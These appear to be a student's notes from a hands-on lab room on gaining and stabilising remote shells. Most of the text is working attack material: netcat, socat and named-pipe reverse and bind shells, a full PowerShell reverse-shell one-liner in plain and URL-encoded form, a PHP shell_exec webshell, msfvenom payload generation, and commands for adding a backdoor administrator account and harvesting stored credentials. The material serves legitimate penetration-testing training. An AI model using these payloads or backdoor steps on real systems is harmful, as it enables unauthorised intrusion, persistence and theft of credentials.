# What the Shell?
## What is a shell?
* Shells are used when interfacing with a Command Line environment (CLI).
  * bash, sh, cmd.exe, Powershell.
* Sometimes possible to force an application running on a remote server to execute arbitrary code.
  * Use this initial access to obtain a shell.
    * Send command line access to the remote server (a reverse shell).
    * Open up a port on the remote server to connect to and execute further commands (a bind shell).

## Tools
* Need malicious shellcode and a way of interfacing with the resulting shell.
* Repositories of shells are available.
  * [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
  * PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
* Kali Linux comes pre-installed with a variety of webshells located at `/usr/share/webshells`.
* [SecLists repo](https://github.com/danielmiessler/SecLists) contains very useful code for obtaining shells.

### Netcat
* 'Swiss Army Knife' of networking.
* Receive reverse shells.
* Connect to remote ports attached to bind shells on a target system.
* Netcat shells are very unstable (easy to lose) by default.

### Socat
* Netcat on steroids.
* Shells are usually more stable than netcat shells.
* Syntax is more difficult.
* Socat is very rarely installed by default.
* Socat and Netcat have .exe versions for use on Windows.

### Metasploit -- multi/handler
* `exploit/multi/handler` module of the Metasploit framework is used to receive reverse shells.
* Provides a fully-fledged way to obtain stable shells.
* Only way to interact with a meterpreter shell.
* Easiest way to handle staged payloads.

### Msfvenom
* Technically part of the Metasploit Framework.
* Shipped as a standalone tool.
* Used to generate reverse and bind shell payloads on the fly.

## Types of Shell
### Reverse shells
* Target is forced to execute code that connects back to the attacking.
* Attacker would set up a listener that would be used to receive the connection.
* Reverse shells are a good way to bypass firewall rules that may prevent connecting to arbitrary ports on the target.
  * Attacker needs to configure their own network to accept the shell when receiving a shell from a machine across the internet the .
* Reverse shells are generally easier to execute and debug.

#### Reverse Shell Example:
* Reverse shell listener is what receives the connection.
```
muri@augury:~$ whoami
muri
```
* Set up the listener on the attacking machine.
  * *Listening* on the attacking machine.
```
muri@augury:~$ sudo nc -lvnp 443
listening on [any] 443 ...
```
* Send a reverse shell from the target.
  * Connection is sent *from* the target. 
  * This is likely to be done through code injection.
```
shell@linux-shell-practice:~$ nc 10.11.12.223 443 -e /bin/bash
```
* Listener receives the connection.
```
connect to [10.11.22.223] from (UNKNOWN) [10.10.199.58] 43286
```
* Commands run over the shell are executed as the target user.
```
whoami
shell
```

### Bind shells
* Where code executed on the target is used to start a listener attached to a shell directly on the target.
* This would then be opened up to the Internet.
* Can connect to the port that the code has opened and obtain remote code execution.
* Does not require any configuration on the attacker's network.
* May be prevented by firewalls protecting the target.
* Bind shells are less common.

#### Bind Shell Example
* Start a listener on the Windows target and tell it to execute cmd.exe.
  * *Listening* on the target.
```
muri@augury:~$ evil-winrm -i 10.10.2.57 -u Administrator -p 'TryH4ckM3!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> nc -lvnp 8080 -r "cmd.exe"
nc.exe : Listening on [any] 8080 ...
    + CategoryInfo          : NotSpecified: (listening on [any] 8080 ...:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
connect to [10.10.2.57] from (UNKNOWN) [10.12.12.223] 57336
```
* Connect to the newly opened port (listener) from the attacking machine.
* This gives code execution on the remote machine.
```
muri@augury:~$ nc 10.10.2.57 8080
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Documents>whoami
whoami
win-shells\administrator

C:\Users\Administrator\Documents
```

## Shell Interactivity
### Interactive 
* Powershell, Bash, Zsh, sh, or any other standard CLI environment are interactive shells.
  * Allow interaction with programs after executing them.

### Non-Interactive 
* Limited to using programs that do not require user interaction to run properly.
* Majority of simple reverse and bind shells are non-interactive.
* Try to run SSH in a non-interactive shell.
```
muri@augury:~$ sudo rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37104
```
* whoami (which is non-interactive) executes perfectly
```
whoami
muri
```
* ssh (which is interactive) gives no output at all.
```
ssh muri@localhost
```
* Interactive programs do not work in non-interactive shells.

## Netcat
### Reverse Shells
* Syntax for starting a netcat listener using Linux.
```nc -lvnp <port-number>
```
  * **`-l`** this will be a listener.
  * **`-v`** request a verbose output.
  * **`-n`** do not to resolve host names or use DNS.
  * **`-p`** port specification will follow.
* Use any port you as long as there is not already a service using it.
  * Use `sudo` when starting the listener if a port below 1024 is chosen.
  * Good idea to use a well-known port number (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.
* Can then connect back to this with any number of payloads.

### Bind Shells
* Can assume that there is already a listener waiting on a chosen port of the target if trying to obtain a bind shell.
* Syntax is straight forward.
```
nc <target-ip> <chosen-port>
```
* Netcat will make an outbound connection to the target on the listening port.

### Netcat Shell Stabilisation
* Netcat shells are very unstable by default.
* Pressing `Ctrl+C` kills the whole thing.
* They are non-interactive and often have strange formatting errors.
  * This is due to netcat 'shells' really being processes running inside a terminal.

#### Technique 1: Python
* Applicable only to Linux boxes as they will nearly always have Python installed by default.
* Use Python to spawn a better featured bash shell.
* Some targets may need the version of Python specified.
  * Replace `python` with `python2` or `python3`.
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
* Shell will look a bit prettier.
  * Still will not be able to use tab autocomplete or the arrow keys.
  * `Ctrl+C` will still kill the shell.
```
shell@linux-shell-practice:~$ export TERM=xterm
```
* Gives access to term commands such as `clear`.
* Background the shell using `Ctrl+Z`.
```
shell@linux-shell-practice:~$ ^Z
[1]+ Stopped                  sudo nc -lvnp 443
```
```
muri@augury:~$ stty raw -echo; fg
sudo nc -lvnp 443
```
* Turns off the terminal echo.
  * Gives access to tab autocompletes, the arrow keys, and Ctrl+C to kill processes.
* Foregrounds the shell completing the process.
* If the shell dies any input in the terminal will not be visible as a result of having disabled terminal echo.
  * Type `reset` and press enter to fix this.
```
shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ ssh shell@localhost
The authenticity of host 'localhost (::1)' can't be established.
[snip ...]
```

#### Technique 2: rlwrap
* Gives access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
* Manual stabilisation is required to be able to use Ctrl+C` inside the shell.
* `rlwrap` is not installed by default on Kali.
  * Install it with `sudo apt install rlwrap`.
* Invoke a slightly different listener.
```
rlwrap nc -lvnp <port>
```
* Prepending the netcat listener with `rlwrap` gives a much more fully featured shell.
* Particularly useful when stabilising Windows shells.
* Possible to completely stabilise a Linix shell using the same trick as in step three of previous technique.
  * Background the shell with `Ctrl+Z`.
  * `stty raw -echo; fg` to stabilise and re-enter the shell.

#### Technique 3: Socat
* The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell.
* Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.
* To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine.
* A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file.
* On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).
* In a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe).
* With any of the above techniques, it's useful to be able to change your terminal tty size.
* This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
* First, open another terminal and run stty -a.
* This will give you a large stream of output. Note down the values for "rows" and columns:
* Next, in your reverse/bind shell, type in: stty rows <number> and stty cols <number>
Filling in the numbers you got from running the command in your own terminal.
This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.

## Socat
* The easiest way to think about socat is as a connector between two points.
* This will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports.
* All socat does is provide a link between two points.

### Reverse Shells
* Here's the syntax for a basic reverse shell listener in socat: socat TCP-L:<port> -
* This is taking two points (a listening port, and standard input) and connecting them together.
* The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.
* On Windows we would use this command to connect back: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
* The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
* This is the equivalent command for a Linux target: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

### Bind Shells
* On a Linux target we would use the following command: socat TCP-L:<PORT> EXEC:"bash -li"
* On a Windows target we would use this command for our listener: socat TCP-L:<PORT> EXEC:powershell.exe,pipes
* We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
* Regardless of the target, we use this command on our attacking machine to connect to the waiting listener: socat TCP:<TARGET-IP>:<TARGET-PORT> -
* Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell.
* This will only work when the target is Linux, but is significantly more stable.
* Here is the new listener syntax: socat TCP-L:<port> FILE:`tty`,raw,echo=0
* We're connecting a listening port, and a file.
* Specifically, we are passing in the current TTY as a file and setting the echo to be zero.
* This is approximately equivalent to using the Ctrl+Z, stty raw -echo; fg trick with a netcat shell with the added bonus of being immediately stable and hooking into a full tty.
* The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command.
* This means that the target must have socat installed.
* Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
* The special command is: socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
* The first part is easy -- we're linking up with the listener running on our own machine.
* The second part of the command creates an interactive bash session with:  EXEC:"bash -li".
* We're also passing the arguments: pty, stderr, sigint, setsid and sane:
* pty, allocates a pseudoterminal on the target -- part of the stabilisation process
* stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
* sigint, passes any Ctrl+C commands through into the sub-process, allowing us to kill commands inside the shell
* setsid, creates the process in a new session
* sane, stabilises the terminal, attempting to "normalise" it.
* On the left of the image below we have a listener running on our local attacking machine.
* On the right we have a simulation of a compromised target, running with a non-interactive shell.
* Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:
* Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH.
* This can then be further improved by setting the stty valuesm which will let us use text editors such as Vim or Nano.
* If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command.
* This is very useful for experimental purposes, but is not usually necessary for general use.

### Socat Encrypted Shells
* One of the many great things about socat is that it's capable of creating encrypted bind and reverse shells.
* Any time TCP is used as part of a socat command, this should be replaced with OPENSSL when working with encrypted shells.
* We first need to generate a certificate in order to use encrypted shells.
* This is easiest to do on our attacking machine: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
* This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
* When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
* We then need to merge the two created files into a single .pem file: cat shell.key shell.crt > shell.pem
* Now, when we set up our reverse shell listener, we use: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
* This sets up an OPENSSL listener using our generated certificate.
* verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
* Please note that the certificate must be used on whichever device is listening.
* To connect back, we would use: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
* The same technique would apply for a bind shell:
* On the target: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
* What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem": socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
* On the attacker: socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
* If your IP is 10.10.10.5, what syntax would you use to connect back to this listener: socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,san
* Note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
* The following image shows an OPENSSL Reverse shell from a Linux target.
* The target is on the right, and the attacker is on the left:
* This technique will also work with the special, Linux-only TTY shell covered previously.

## Common Shell Payloads
* In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection.
* For example, as a listener: nc -lvnp <PORT> -e /bin/bash
* Connecting to the above listener with netcat would result in a bind shell on the target.
* Equally, for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.
* However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?).
* On Windows where a static binary is nearly always required anyway, this technique will work perfectly.
* On Linux, however, we would instead use this code to create a listener for a bind shell: mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
* The following paragraph is the technical explanation for this command:
* The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.
* A very similar command can be used to send a netcat reverse shell: mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
* This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.
* When targeting a modern Windows Server, it is very common to require a Powershell reverse shell.
* This command is very convoluted, so for the sake of simplicity it will not be explained directly here.
* It is, however, an extremely useful one-liner to keep on hand:
* powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
* In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port.
* It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:
* For other common reverse shell payloads, PayloadsAllTheThings is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. 

## Msfvenom
* Msfvenom: the one-stop-shop for all things payload related.
* Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.
* It can be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py).
* The standard syntax for msfvenom is: msfvenom -p <PAYLOAD> <OPTIONS>
* For example, to generate a Windows x64 Reverse Shell in an exe format, we could use: msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
* Here we are using a payload and four options:
* -f <format>
* Specifies the output format. In this case that is an executable (exe)
* -o <file>
* The output location and filename for the generated payload.
* LHOST=<IP>
* Specifies the IP to connect back to.
* LPORT=<port>
* The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

## Staged vs Stageless Payloads
### Staged
* These payloads are sent in two parts.
* The first part is called the stager.
* This is a piece of code which is executed directly on the server itself.
* It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
* Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
* Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated.
* Staged payloads require a special listener -- usually the Metasploit multi/handler.
* Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software.
* Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

### Stageless 
* These payloads are more common and what we've been using up until now.
* They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
* Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.

## Meterpreter Shell
* Meterpreter shells are Metasploit's own brand of fully-featured shell.
* They are completely stable, making them a very good thing when working with Windows targets.
* They also have a lot of inbuilt functionality of their own, such as file uploads and downloads.
* If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell.
* The downside to meterpreter shells is that they must be caught in Metasploit.

## Payload Naming Conventions
* When working with msfvenom, it's important to understand how the naming system works.
* The basic convention is as follows: <OS>/<arch>/<payload>
* For example: linux/x86/shell_reverse_tcp
* This would generate a stageless reverse shell for an x86 Linux target.
* The exception to this convention is Windows 32bit targets.
* For these, the arch is not specified.
* E.g.: windows/shell_reverse_tcp
* For a 64bit Windows target, the arch would be specified as normal (x64).
* In the above examples the payload used was shell_reverse_tcp.
* This indicates that it was a stageless payload.
* Stageless payloads are denoted with underscores (_).
* The staged equivalent to this payload would be: shell/reverse_tcp
* As staged payloads are denoted with another forward slash (/).
* This rule also applies to Meterpreter payloads.
* A Windows 64bit staged Meterpreter payload would look like this: windows/x64/meterpreter/reverse_tcp
* A Linux 32bit stageless Meterpreter payload would look like this: linux/x86/meterpreter_reverse_tcp
* Aside from the msfconsole man page, the other important thing to note when working with msfvenom is: msfvenom --list payloads
* This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads.
* This gives us a full set of Linux meterpreter payloads for 32bit targets.

## Metasploit multi/handler
* Multi/Handler is a superb tool for catching reverse shells.
* It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.
* It's relatively easy to use:
* Open Metasploit with msfconsole
* Type use multi/handler, and press enter
* We are now primed to start a multi/handler session.
* Let's take a look at the available options using the options command:
* There are three options we need to set: payload, LHOST and LPORT.
* These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell.
* Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with.
* set PAYLOAD <payload>
* set LHOST <listen-address>set LPORT <listen-port>
* We should now be ready to start the listener!
* Let's do this by using the exploit -j command. 
* This tells Metasploit to launch the module, running as a job in the background.
* You may notice that in the above screenshot, Metasploit is listening on a port under 1024.
* To do this, Metasploit must be run with sudo permissions.
* When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:
* Notice that, because the multi/handler was originally backgrounded, we needed to use sessions 1 to foreground it again.
* This worked as it was the only session running.
* Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions <number> to select the appropriate session to foreground.
* This number would also have been displayed in the line where the shell was opened

## WebShells
* There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file.
* Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible.
* In these cases we would instead upload a webshell.
* "Webshell" is a colloquial term for a script that runs inside a web server (usually in a language such as PHP or ASP) which executes code on the server.
* Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page.
* This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.
* As PHP is still the most common server side scripting language, let's have a look at some simple code for this.
* In a very basic one line format: <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
* This will take a GET parameter in the URL and execute it on the system with shell_exec().
* Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux.
* The "pre" elements are to ensure that the results are formatted correctly on the page.
* Notice that when navigating the shell, we used a GET parameter "cmd" with the command "ifconfig", which correctly returned the network information of the box.
* In other words, by entering the ifconfig command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us.
* This would work for any other command we chose to use (e.g. whoami, hostname, arch, etc).
* As mentioned previously, there are a variety of webshells available on Kali by default at /usr/share/webshells -- including the infamous PentestMonkey php-reverse-shell -- a full reverse shell written in PHP.
* Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers.
* They will not work on Windows by default.
* When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server.
* With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell.
* This would be copied into the URL as the cmd argument: powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
* This is the same shell we encountered in the Common Shell Payloads section.
* However, it has been URL encoded to be used safely in a GET parameter.
* Remember that the IP and Port (bold, towards the end of the top line) will still need to be changed in the above code.

## Next Steps
* Ok, we have a shell. Now what?
* The one thing that these all have in common is that shells tend to be unstable and non-interactive.
* Even Unix style shells which are easier to stabilise are not ideal.
* On Linux ideally we would be looking for opportunities to gain access to a user account.
* SSH keys stored at /home/<user>/.ssh are often an ideal way to do this.
* In CTFs it's also not infrequent to find credentials lying around somewhere on the box.
* Some exploits will also allow you to add your own account.
* In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
* On Windows the options are often more limited.
* It's sometimes possible to find passwords for running services in the registry.
* VNC servers, for example, frequently leave passwords in the registry stored in plaintext.
* Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml or C:\xampp\FileZilla Server\FileZilla Server.xml.
* These can be MD5 hashes or in plaintext, depending on the version.
* Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges.
* In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
* The syntax for this is as follows: net user <username> <password> /add and net localgroup administrators <username> /add

## The important takeaway
* Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell.
* Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.

## Practice and Examples
* Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.
* Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your attacking machine’s IP with a custom port. Set up a netcat listener, then upload and activate the shell.
* Make a copy of the supplied webshell on the attacking machine’s Desktop:
* cp  /usr/share/webshells/php/php-reverse-shell.php ./Desktop
* Edit the webshell:
* vim ./Desktop/php-reverse-shell.php
* Press ‘i’ to enter insert mode
* Change ip to 10.10.52.172
* Press ‘Escape’ to enter Command mode
* Press ‘:wq’ to save changes and exit file
* Setup NetCat listener on attack machine:
* nc -lvnp 1234
* Upload webshell to target:
* Browse to http://10.10.62.10 from attacking machine
* Click ‘Browse’ button
* Navigate to /root/Desktop/php-reverse-shell.php
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Execute webshell on target by amending URL:
* http://10.10.62.10/uploads/php-reverse-shell.php?cmd=nc 10.10.52.172 1234 -e /bin/bash
* Reverse shell creates session back to listener:

### Extra: stabilise the netcat:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

Background the shell using Ctrl+Z
. 
stty raw -echo; fg
```
* Log into the Linux machine over SSH using the supplied credentials.
* Use the techniques in the Common Shell Payloads section to experiment with bind and reverse netcat shells.
* SSH onto the target machine:
* ssh shell@10.10.62.10
* Create a reverse shell and execute the bash process upon connection:
* On target machine: nc 10.10.52.172 1234 -e /bin/bash
* Create listener on attacker’s terminal: nc -lvnp 1234
* Create a bind shell and execute the bash process upon connection:
* On target machine create a listener: nc -lvnp 1234 -e /bin/bash
* Connect to listener from attack machine: nc 10.10.62.10 1234
* Create named pipe for bind shell:
* Create listener on target’s terminal: mkfifo /tmp/f; nc -lvnp 1234 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
* This creates a named pipe at /tmp/f, stats a nc listener, directs the listener’s input (sent commands) into the output of the named pipe, pipes this to bin/sh, and removes the pipe at the end
* Connect NetCat to listener on attacker’s terminal: nc 10.10.19.211 1234
* Bind shell connected to named pipe method:
* Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
* Create reverse shell and execute the bash process upon connection:
* Create reverse shell on target’s terminal to connect to listener: socat TCP:10.10.52.172:1234 EXEC:”bash -li”
* Create listener on attacker’s terminal: socat TCP-L:1234 -
* Reverse shell connects to listener:
* Create bind shell and execute the bash process upon connection:
* Create listener on target’s terminal: socat TCP-L:12345 EXEC:”bash -li”
* Bind to listener from attacker’s terminal: socat TCP:10.10.62.10:12345 -
* Bind shell connects to listener:
* Create fully stable reverse shell using socat special technique:
* Create listener on attacter’s terminal: socat TCP-L:1234 FILE:`tty`,raw,echo=0
* Create tty reverse shell on target’s terminal: socat TCP:10.10.108.143:1234 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
* Fully interactive session is created on attacker’s terminal
* Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
* Create new php file in attacker’s terminal:
* cat > /root/Desktop/windows-php-reverse-shell.php
* Add text to file: <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
* CTRL+C to write changes to file
* Upload webshell to target:
* Browse to http://10.10.122.18 from attacker
* Click ‘Browse’ button
* Navigate to /root/Desktop/windows-php-reverse-shell.php
* Click ‘Open’ to select the file
* Click ‘Submit’ to upload the file
* Create listener in attacker’s terminal: nc -lvnp 1234
* Verify that webshell GET parameter (‘cmd’) is working by passing ‘ipconfig’ command in attacker’s browser: http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=ipconfig
* Execute Powershell in attacker’s browser by copying powershell into the URL as the cmd argument:
http://10.10.122.18/uploads/windows-php-reverse-shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.108.143%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
* Amend the <IP> to the attacker’s IP address and the <port> to 1234
* Connection from target received:
* The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.
* Create a new user:
* In the reverse shell session created in the previous task: net user /add newadmin password
* Add the new user to the Administrators group:
* net localgroup administrators newadmin /add
* Login over RDP using new user account:
* On the attacker’s terminal: xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:newadmin /p:'password'
* RDP connects after acknowledging certificate CN mismatch:
* Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
* Create Netcat reverse shell
* Start listener in attacker’s terminal: nc -lvnp 1234
* Create RDP session using supplied administrative credentials: xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.70.179 /u:Administrator /p:'TryH4ckM3!'
* Open command prompt on target and create bind shell: nc 10.10.248.19 1234 -e “powershell.exe”
* Connection established:
* Create Netcat bind shell (using existing RDP session):
* Open command prompt on target and create listener: nc -lvnp 1234 -e “powershell.exe”
* Create an outbound connection from the attacker’s terminal: nc 10.10.70.179 1234
* Session is established:
* Create a socal reverse shell (using existing RDP session):
* Start listener in attacker’s terminal: socat TCP-L:1234 -
* Open command prompt and create connection back to listener: socat TCP:10.10.18.162:1234 EXEC:powershell.exe,pipes
* Session established:
* Create a socat bind shell (using existing RDP session):
* Create listener at command prompt of target: socat TCP-L:1234 EXEC:powershell.exe,pipes
* Connect to waiting listener from attacker’s terminal: socat TCP:10.10.70.179:1234 -
* Session established:
* Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
* Create msfvenom payload:
* msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.248.19 LPORT=1234
